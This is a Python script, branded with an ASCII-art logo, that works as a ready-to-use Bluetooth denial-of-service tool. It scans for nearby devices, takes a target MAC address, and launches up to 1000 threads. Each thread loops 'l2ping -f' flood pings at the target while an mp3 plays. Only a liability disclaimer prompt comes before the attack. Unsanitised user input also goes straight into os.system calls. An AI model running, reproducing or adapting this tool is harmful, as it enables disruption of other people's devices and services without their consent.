#!/usr/bin/env python3
import os
import threading
import time
import subprocess

def DOS(target_addr, packages_size):
    while True:
        os.system(f'l2ping -i hci0 -s {packages_size} -f {target_addr}')

def play_mp3(file_path):
    os.system(f'mpg123 {file_path}')

def play_noise(file_path):
    while True:
        os.system(f'aplay {file_path}')

def printLogo():
    print('\x1b[36m /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\ ')
    print('\x1b[36m( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )')
    print('\x1b[36m > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ < ')
    print('\x1b[36m /\_/\  ██████╗ ██╗     ██╗   ██╗███████╗███████╗ ██████╗ ███╗   ██╗   /\_/\ ')
    print('\x1b[36m( o.o ) ██╔══██╗██║     ██║   ██║██╔════╝██╔════╝██╔═══██╗████╗  ██║  ( o.o )')
    print('\x1b[36m > ^ <  ██████╔╝██║     ██║   ██║█████╗  ███████╗██║   ██║██╔██╗ ██║   > ^ < ')
    print('\x1b[36m /\_/\  ██╔══██╗██║     ██║   ██║██╔══╝  ╚════██║██║   ██║██║╚██╗██║   /\_/\ ')
    print('\x1b[36m( o.o ) ██████╔╝███████╗╚██████╔╝███████╗███████║╚██████╔╝██║ ╚████║  ( o.o )')
    print('\x1b[36m > ^ <  ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝   > ^ < ')
    print('\x1b[36m /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\  /\_/\ ')
    print('\x1b[36m( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )( o.o )')
    print('\x1b[36m > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ <  > ^ < ')
    print('\x1b[36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')

def main():
    printLogo()
    time.sleep(0.1)
    print('\x1b[36mUse of this software is at your own risk. The developers assume no liability for any misuse or damage caused.')
    print('\x1b[36m_____________________________________________________________________________')
    
    if input("[o_o] Do you agree? (y/n) => ").lower() == 'y':
        time.sleep(0.1)
        os.system('clear')
        printLogo()
        print('')
        print("[o_o] Scanning ...")
        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        lines = output.splitlines()
        del lines[0]  
        
        devices = []
        print("|  ID   |      MAC_Address     |     Device_Name    |")
        for id, line in enumerate(lines):
            info = line.split()
            mac = info[0]
            devices.append(mac)
            name = ' '.join(info[1:])
            print(f"|   {id:<5}|   {mac:<17}|   {name}|")
        
        target_id = input('[o_o] Target ID or MAC => ')
        try:
            target_addr = devices[int(target_id)]
        except (ValueError, IndexError):
            target_addr = target_id
        
        if not target_addr:
            print('[o_o] ERROR: Target addr is missing')
            exit(0)
        
        try:
            packages_size = int(input('[o_o] Packages Size? (600 is optimal) => '))
        except ValueError:
            print('[o_o] ERROR: Packages size must be an integer')
            exit(0)
        
        try:
            threads_count = int(input('[o_o] Threads Count? (between 1 to 1000💀die) => '))
        except ValueError:
            print('[o_o] ERROR: Threads count must be an integer')
            exit(0)
        
        print("\x1b[31m[*] [o_o] Starting DOS attack in 3 seconds...")
        for i in range(3, 0, -1):
            print(f'[*] {i}')
            time.sleep(1)
        
        os.system('clear')
        print('[*] [o_o] Building threads...\n')
        
        for i in range(threads_count):
            print(f'[*] [o_o] Built thread №{i + 1}')
            threading.Thread(target=DOS, args=(target_addr, packages_size)).start()
            play_mp3('chipi.mp3')
            
        
        print('[*] [o_o] Built all threads...')
        print('[*] [o_o] Starting...')

        print('[*] [o_o] Playing continuous noise...')
        threading.Thread(target=play_noise, args=('chipi.mp3',)).start()

        print('[*] [o_o] Attempting to play MP3 file...')
        play_mp3('chipi.mp3')
        print('[*] [o_o] MP3 playback finished.')

    else:
        print('Bip bip')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print(f'[!] ERROR: {e}')
